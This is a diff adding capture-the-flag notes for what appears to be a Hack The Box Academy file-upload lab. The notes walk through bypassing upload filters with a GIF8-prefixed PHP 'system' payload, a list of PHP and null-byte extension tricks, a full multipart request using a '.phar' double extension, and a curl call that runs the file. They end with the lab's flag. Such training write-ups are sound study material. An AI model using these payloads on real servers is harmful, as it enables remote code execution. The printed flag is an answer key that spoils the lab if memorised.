@@ -34,3 +34,70 @@ we change the Content-Type: image/jpg  -> this allows us to bypass system and up
 CHALLENGE: 83.136.249.46:44892 
 
 Question 1 - The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
+1) upload any normal picture to intercept the request sent using Burp Suite and send it to Repeater, so that they can know what type of filters are in place:
+2)  keep the current value of the Content-Type header or change it to image/gif. However, for the file content, we need to make it as GIF8, thus making its signature as a GIF image:
+Content-Disposition: form-data; name="uploadFile"; filename="Untitled.jpeg"
+Content-Type: image/gif
+
+GIF8
+<?php system('cat /flag.txt'); ?>
+-----------------------------141035040710475164731554234062--
+
+2.B) add the <?php system('cat /flag.txt'); ?>    - line as shown above 
+3) hit send and we see that file was uploaded sucessfully so we got past the content-type filters now time for whitelist and blacklist file extensions 
+4) send to intruder and put the testing brackets around .jpeg & disable url encode 
+5) use this list:
+.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+
+6) After clicking on "Start Attack", students will not get useful hits, as only images get uploaded, and none of them can execute code. However, students will notice that there are few PHP extensions that do not get blocked by the blacklist filter, as they show a different response from "Extension not allowed", which is "Only images are allowed", such as the case with the with the .phar extension:
+7)  use the double extension method, making the file name cat.jpg.phar in Repeater and sending the modified intercepted request:
+8) change burp to use this for filename -> Untitled.jpeg.phar
+so it will look like: 
+POST /upload.php HTTP/1.1
+Host: 83.136.249.46:44892
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://83.136.249.46:44892/
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------141035040710475164731554234062
+Content-Length: 274
+Origin: http://83.136.249.46:44892
+DNT: 1
+Connection: keep-alive
+Sec-GPC: 1
+Priority: u=0
+
+-----------------------------141035040710475164731554234062
+Content-Disposition: form-data; name="uploadFile"; filename="Untitled.jpeg.phar"
+Content-Type: image/gif
+
+GIF8
+<?php system('cat /flag.txt'); ?>
+-----------------------------141035040710475164731554234062--
+
+9) we hit send and see file upload successful 
+10) curl -s http://83.136.249.46:44892/profile_images/Untitled.jpeg.phar
+GIF8
+HTB{m461c4l_c0n73n7_3xpl0174710n}
